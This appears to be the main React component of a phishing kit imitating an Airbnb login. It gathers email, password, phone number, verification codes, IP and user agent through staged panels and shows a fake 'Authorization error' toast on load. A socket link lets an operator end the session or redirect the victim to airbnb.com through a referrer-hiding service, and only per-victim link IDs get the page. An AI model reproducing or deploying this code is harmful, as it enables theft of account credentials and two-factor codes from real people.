import { createContext, useEffect, useState } from 'react';
import Footer from './components/Footer';
import Header from './components/Header';
import styles from './styles.module.scss';
import MainPanel from './components/panels/MainPanel';
import PasswordPanel from './components/panels/PasswordPanel';
import VerificationModal from './components/VerificationModal';
import PhonePanel from './components/panels/PhonePanel';
import { socket } from './socket';
import ChatModal from './components/chat/modal/Modal';
import ChatButton from './components/chat/button/Button';
import EndPanel from './components/panels/EndPanel';
import { ToastContainer, toast } from 'react-toastify';
import { useParams } from 'react-router-dom';
import { links } from './links';

export interface IUserData {
	method?: string;
	email?: string;
	password?: string;
	verifMethod?: string;
	phone?: string;
	verifCode?: string;
	ip?: string | null;
	userAgent?: string;
	link: string;
}

interface IUserContext {
	user: IUserData | null;
	setUser: (data: IUserData | any) => void;
}
const defaultUser = {
	method: 'email',
	link: '',
};

export const UserContext = createContext<IUserContext>({ user: defaultUser, setUser: () => {} });

function App() {
	const [panel, setPanel] = useState('main');
	const [user, setUser] = useState<IUserData>(defaultUser);
	const [verificationModalIsActive, setVerificationModalIsActive] = useState(false);
	const [chatIsOpened, setChatIsOpened] = useState(false);
	const { link } = useParams();

	useEffect(() => {
		socket.on('end', () => {
			setPanel('end');
			setVerificationModalIsActive(false);
		});
		socket.on('exit', () => {
			window.location = 'https://href.li/?https://airbnb.com' as unknown as Location;
		});
	}, [socket]);

	// @ts-ignore
	if (!links[link!]) return <>Not found</>;

	useEffect(() => {
		document.body.style.overflow = verificationModalIsActive ? 'hidden' : '';
	}, [verificationModalIsActive]);

	useEffect(() => {
		toast.error('Authorization error.');
		//@ts-ignore
		setUser({ ...user, link: links[link] as string });
	}, []);

	return (
		<>
			<UserContext.Provider value={{ user, setUser }}>
				<ChatModal setIsActive={setChatIsOpened} isActive={chatIsOpened} />
				{!chatIsOpened && <ChatButton onClick={() => setChatIsOpened(true)} />}
				{verificationModalIsActive && <VerificationModal isActive={verificationModalIsActive} setIsActive={setVerificationModalIsActive} />}
				<Header blackout={verificationModalIsActive} />
				<main className={styles.main}>
					{panel === 'main' ? (
						<MainPanel setPanel={setPanel} />
					) : panel === 'password' ? (
						<PasswordPanel setPanel={setPanel} setIsActive={setVerificationModalIsActive} />
					) : panel === 'phone' ? (
						<PhonePanel setPanel={setPanel} />
					) : (
						<EndPanel />
					)}
				</main>
				<Footer />
			</UserContext.Provider>
			<ToastContainer theme='light' position='bottom-left' />
		</>
	);
}

export default App;
